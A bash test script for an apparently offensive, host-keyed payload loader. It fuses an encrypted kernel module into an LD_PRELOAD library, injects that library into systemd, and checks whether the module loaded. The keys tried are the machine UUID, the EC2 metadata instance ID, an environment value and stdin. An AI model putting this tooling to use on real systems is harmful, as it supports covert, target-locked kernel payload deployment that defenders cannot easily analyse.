#!/bin/bash

testdecrypt() {
	for ((i=0; i < 80; i++)); do
		echo -n "-"
	done
	echo

	cp "${loader}.bak" "${loader}" || \
		exit 1

	echo "stage 1: fusing '${payload}' payload with '${loader}' using '${payloadfuser}':"
	"${payloadfuser}" "${payload}" "${loader}" "$1" || \
		exit 1

	echo
	echo "stage 2: executing '${loader}':"
	echo "${stdinkey}" | KEY="${envkey}" LD_PRELOAD="${loader}" "${targetbin}"

	echo
	echo -n "module loaded:"
	lsmod | grep -q kernel_module
	if [ $? -eq 0 ]; then
		echo " YES"
		echo "unloading"
		rmmod kernel_module
	else
		echo " NO"
	fi

	echo
}

egrep -q "Red Hat Enterprise Linux Server release 7|CentOS Linux release 7" /etc/redhat-release 
if [ $? -ne 0 ]; then
	echo "error: currently only RHEL/CentOS 7 is supported" >&2
	exit 1
fi

# unload any left behind kernel modules
lsmod | grep -q kernel_module && \
	rmmod kernel_module

loader="./loader.so"
targetbin="/usr/lib/systemd/systemd"
payloadfuser="./payloadfuser"
productuuid="$(cat /sys/class/dmi/id/product_uuid)"
envkey="TEST-ENV-KEY"
stdinkey="TEST-STDIN-KEY"
payload="./kernel-module.ko"
metadata="http://169.254.169.254/latest/meta-data/instance-id"

if [ ! -x "${loader}" ]; then
	echo "error: cannot open '${loader}'" >&2
	exit 1
fi

if [ ! -x "${payloadfuser}" ]; then
	echo "error: cannot open '${payloadfuser}'" >&2
	exit 1
fi

# since we run 4 test cases we need to keep the original loader around
cp "${loader}" "${loader}.bak" || \
	exit 1

testdecrypt "${productuuid}" || \
	exit 1

# check if we're on EC2
curl -m 1 "${metadata}" >/dev/null 2>&1
if [ $? -eq 0 ]; then
	testdecrypt "$(curl -s -m 1 "${metadata}")" || \
		exit 1
fi

testdecrypt "${envkey}" || \
	exit 1

testdecrypt "${stdinkey}" || \
	exit 1

rm -f "${loader}.bak"

exit 0
